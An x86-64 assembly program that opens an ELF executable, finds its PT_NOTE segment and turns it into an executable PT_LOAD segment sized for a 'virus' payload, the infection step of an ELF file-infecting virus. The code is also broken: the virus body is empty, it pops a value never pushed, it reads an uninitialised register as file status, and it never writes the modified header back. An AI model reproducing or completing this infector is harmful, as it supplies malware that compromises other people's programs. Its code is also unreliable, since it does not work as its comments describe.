section .bss
buffer resb 10000            ; 10KB buffer to load ELF file

section .text
global _start

v_start:
    
v_stop:


_start:
    ; -------- Parse command line arguments --------
    mov rdi, [rsp + 16]       ; argv[1] (path to ELF file)
    test rdi, rdi
    jz exit_usage             ; If no argument, exit

    ; -------- Open the file --------
    mov rax, 2                ; sys_open
    mov rsi, 0                ; O_RDONLY
    syscall
    cmp rax, 0
    js exit_error
    mov rdi, rax              ; Save file descriptor

    ; -------- Read file into buffer --------
    lea rsi, [buffer]         ; Address of buffer
    mov rdx, 10000            ; Buffer size
    mov rax, 0                ; sys_read
    syscall
    cmp rax, 0
    js exit_error
    mov rbx, rax              ; Save number of bytes read
    mov r8, rbx               ; Store file size in r8
    lea rax, [buffer]         ; rax now points to the ELF base address

    ; -------- Parse Program Header Table --------
parse_phdr:
    xor rcx, rcx              ; rcx = 0 (counter for entries)
    xor rdx, rdx              ; rdx = 0 (store entry size)

    mov cx, word [rax + 0x38] ; e_phnum: Number of program headers
    mov rbx, qword [rax + 0x20] ; e_phoff: Offset of program header table
    mov dx, word [rax + 0x36] ; e_phentsize: Size of each program header

    lea rbx, [rax + rbx]      ; rbx = address of the first program header

    ; -------- Loop through Program Headers --------
loop_phdr:
    cmp rcx, 0                ; If counter <= 0, stop
    jle phdr_not_found

    mov edi, dword [rbx + 0x00] ; e_phdr.type at offset 0x00
    cmp edi, 0x4              ; Compare with PT_NOTE
    je pt_note_found          ; If equal, PT_NOTE found

    ; Increment to the next Program Header
    add rbx, rdx              ; rbx = rbx + e_phentsize
    dec rcx                   ; Decrement phnum counter
    jmp loop_phdr

phdr_not_found:
    ; No PT_NOTE found, exit with error
    mov rax, 60               ; sys_exit
    mov rdi, 2                ; Exit code 2
    syscall

pt_note_found:
    ; PT_NOTE segment found, rbx points to it
    
    ; -------- Change the Segment Type --------
    mov dword [rbx + 0x00], 0x1           ; Change p_type to PT_LOAD (1)

    ; -------- Modify the Segment Flags --------
    mov dword [rbx + 0x04], 0x5           ; Set p_flags to PF_X | PF_R (1 | 4)

    ; -------- Set the File Offset --------
    ; pop rax to retrieve the target EOF offset (previously pushed)
    pop rax                              ; rax = target EOF offset
    mov qword [rbx + 0x08], rax          ; Set p_offset = target EOF offset

    ; -------- Calculate and Set Virtual Address --------
    ; Load stat.st_size (file size) into r13
    mov r13, [r15 + 48]                  ; r13 = stat.st_size
    add r13, 0xc000000                   ; Add 0xc000000 (high memory address)
    mov qword [rbx + 0x10], r13          ; Set p_vaddr = new virtual address

    ; -------- Set Physical Address --------
    mov qword [rbx + 0x18], r13          ; Set p_paddr = same as p_vaddr

    ; -------- Adjust File Size --------
    mov rax, v_stop - v_start + 5        ; Calculate virus size + 5 (jmp instruction)
    add qword [rbx + 0x20], rax          ; Increase p_filesz by virus size + 5

    ; -------- Adjust Memory Size --------
    add qword [rbx + 0x28], rax          ; Increase p_memsz by virus size + 5

    ; -------- Set Alignment --------
    mov qword [rbx + 0x30], 0x200000     ; Set p_align = 2MB (0x200000)

    ; -------- Return --------
    ret

exit_usage:
    mov rax, 60               ; sys_exit
    mov rdi, 1                ; Exit code 1
    syscall

exit_error:
    mov rax, 60               ; sys_exit
    mov rdi, 3                ; Exit code 3
    syscall
